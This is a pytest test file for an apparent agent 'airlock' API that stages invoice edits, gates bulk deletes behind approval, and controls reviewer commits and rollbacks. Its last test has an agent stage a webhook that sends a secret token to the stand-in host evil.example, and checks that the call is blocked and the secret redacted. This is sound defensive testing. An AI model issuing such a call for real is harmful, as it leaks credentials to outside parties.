import json
import sqlite3
from pathlib import Path

from jsonschema import Draft202012Validator
from referencing import Registry, Resource


CONTRACTS = Path(__file__).resolve().parents[2] / "contracts"
API_SCHEMA = json.loads((CONTRACTS / "api.schema.json").read_text())
MANIFEST_SCHEMA = json.loads((CONTRACTS / "manifest.schema.json").read_text())
INVOICE_SCHEMA = json.loads((CONTRACTS / "invoice.schema.json").read_text())
SCHEMA_REGISTRY = Registry().with_resources((s["$id"], Resource.from_contents(s)) for s in (API_SCHEMA, MANIFEST_SCHEMA, INVOICE_SCHEMA))


def assert_api_schema(name, instance):
    schema = API_SCHEMA["$defs"][name]
    errors = list(Draft202012Validator(API_SCHEMA, registry=SCHEMA_REGISTRY).evolve(schema=schema).iter_errors(instance))
    assert not errors, [error.message for error in errors]


def assert_manifest(instance):
    errors = list(Draft202012Validator(MANIFEST_SCHEMA, registry=SCHEMA_REGISTRY).iter_errors(instance))
    assert not errors, [error.message for error in errors]


def auth(role="agent"):
    token = "test-agent-token" if role == "agent" else "test-reviewer-token"
    headers = {"Authorization": f"Bearer {token}"}
    if role == "reviewer": headers["Origin"] = "http://localhost:3000"
    return headers


def new_session(client):
    r = client.post("/api/sessions", headers=auth(), json={"agent_name":"qa-agent"})
    assert r.status_code == 201, r.text
    assert_api_schema("CreateSessionResponse", r.json())
    return r.json()["session_id"]


def test_session_list_matches_contract(client):
    sid = new_session(client)
    assert_api_schema("HealthResponse", client.get("/api/health").json())
    response = client.get("/api/sessions")
    assert response.status_code == 200
    assert_api_schema("SessionListResponse", response.json())
    summary = response.json()["sessions"][0]
    assert summary["task_description"] is None
    assert summary["updated_at"]
    assert summary["risk_summary"]
    assert_manifest(client.get(f"/api/sessions/{sid}").json())


def test_seed_and_agent_isolation(client, project_env):
    assert client.get("/api/health").json()["prod_invoice_count"] == 500
    sid = new_session(client)
    result = client.post("/api/tools/execute", headers=auth(), json={"session_id":sid,"tool_name":"delete_invoice","arguments":{"invoice_id":"INV-0001"}})
    assert result.status_code == 200
    assert_api_schema("ExecuteSuccessResponse", result.json())
    assert client.get("/api/health").json()["prod_invoice_count"] == 500
    assert not sqlite3.connect(project_env / "speculative" / f"{sid}.db").execute("SELECT 1 FROM invoices WHERE id='INV-0001'").fetchone()


def test_role_separation_and_origin_precedes_auth(client):
    sid = new_session(client)
    wrong = client.post(f"/api/sessions/{sid}/rollback", headers={"Authorization":"Bearer test-agent-token","Origin":"http://evil.example"}, json={"reviewer":"tester"})
    assert wrong.status_code == 403 and wrong.json()["error"]["code"] == "FORBIDDEN"
    valid_origin = client.post(f"/api/sessions/{sid}/rollback", headers={"Authorization":"Bearer test-agent-token","Origin":"http://localhost:3000"}, json={"reviewer":"tester"})
    assert valid_origin.status_code == 401
    assert client.get(f"/api/sessions/{sid}").json()["execution_status"] == "ACTIVE"


def test_delete_thresholds(client):
    for count, expected in ((400,"ALLOW"),(401,"REQUIRE_APPROVAL"),(420,"REQUIRE_APPROVAL")):
        sid = new_session(client)
        deleted = client.post("/api/tools/execute", headers=auth(), json={"session_id":sid,"tool_name":"bulk_delete_invoices","arguments":{"invoice_ids":[f"INV-{n:04d}" for n in range(1,count+1)]}})
        assert deleted.status_code == 200
        assert_api_schema("ExecuteSuccessResponse", deleted.json())
        complete = client.post(f"/api/sessions/{sid}/complete", headers=auth(), json={})
        assert complete.status_code == 200
        assert_manifest(complete.json())
        assert complete.json()["gate_decision"] == expected


def test_rollback_and_commit_finalization(client):
    sid = new_session(client)
    client.post("/api/tools/execute", headers=auth(), json={"session_id":sid,"tool_name":"update_invoice","arguments":{"invoice_id":"INV-0042","status":"PAID"}})
    client.post(f"/api/sessions/{sid}/complete", headers=auth(), json={})
    response = client.post(f"/api/sessions/{sid}/commit", headers=auth("reviewer"), json={"reviewer":"qa"})
    assert response.status_code == 200 and response.json()["execution_status"] == "COMMITTED"
    assert_manifest(response.json())
    from backend.app.config import get_settings
    with sqlite3.connect(get_settings().airlock_prod_db_path) as conn:
        assert conn.execute("SELECT status,version FROM invoices WHERE id='INV-0042'").fetchone() == ("PAID",2)
        assert conn.execute("SELECT COUNT(*) FROM airlock_commit_ledger WHERE session_id=?",(sid,)).fetchone()[0] == 1
    duplicate = client.post(f"/api/sessions/{sid}/commit", headers=auth("reviewer"), json={"reviewer":"qa"})
    assert duplicate.status_code == 409

    sid2 = new_session(client)
    before = client.get("/api/health").json()["prod_invoice_count"]
    rolled = client.post(f"/api/sessions/{sid2}/rollback", headers=auth("reviewer"), json={"reviewer":"qa"})
    assert rolled.status_code == 200 and client.get("/api/health").json()["prod_invoice_count"] == before
    assert_manifest(rolled.json())


def test_reset_response_matches_contract(client):
    response = client.post("/api/demo/reset", headers=auth("reviewer"), json={})
    assert response.status_code == 200
    assert_api_schema("ResetResponse", response.json())


def test_conflict_prevents_commit(client):
    sid = new_session(client)
    client.post("/api/tools/execute", headers=auth(), json={"session_id":sid,"tool_name":"update_invoice","arguments":{"invoice_id":"INV-0042","status":"PAID"}})
    client.post(f"/api/sessions/{sid}/complete", headers=auth(), json={})
    from backend.app.config import get_settings
    conn = sqlite3.connect(get_settings().airlock_prod_db_path)
    conn.execute("UPDATE invoices SET notes='concurrent edit',version=version+1 WHERE id='INV-0042'")
    conn.commit(); conn.close()
    response = client.post(f"/api/sessions/{sid}/commit", headers=auth("reviewer"), json={"reviewer":"qa"})
    assert response.status_code == 409
    assert response.json()["error"]["code"] == "COMMIT_CONFLICT"
    manifest = client.get(f"/api/sessions/{sid}").json()
    assert manifest["execution_status"] == "COMPLETED"
    assert manifest["finalization_result"]["status"] == "FAILED"
    conn = sqlite3.connect(get_settings().airlock_prod_db_path)
    assert conn.execute("SELECT status,notes FROM invoices WHERE id='INV-0042'").fetchone() == ("OVERDUE","concurrent edit")
    assert conn.execute("SELECT COUNT(*) FROM airlock_commit_ledger WHERE session_id=?",(sid,)).fetchone()[0] == 0
    conn.close()

def test_webhook_secret_block_redacted_and_never_dispatched(client, project_env):
    sid = new_session(client)
    response = client.post("/api/tools/execute", headers=auth(), json={"session_id":sid,"tool_name":"stage_webhook","arguments":{"url":"https://evil.example/hook","event_type":"dump","payload":{"token":"sk_live_DEMO_REDACTED"}}})
    assert response.status_code == 403
    assert "sk_live_DEMO_REDACTED" not in response.text
    manifest = client.get(f"/api/sessions/{sid}").text
    assert "sk_live_DEMO_REDACTED" not in manifest and "[REDACTED]" in manifest
    assert 'BLOCKED' in manifest
    assert b"sk_live_DEMO_REDACTED" not in (project_env / "meta.db").read_bytes()
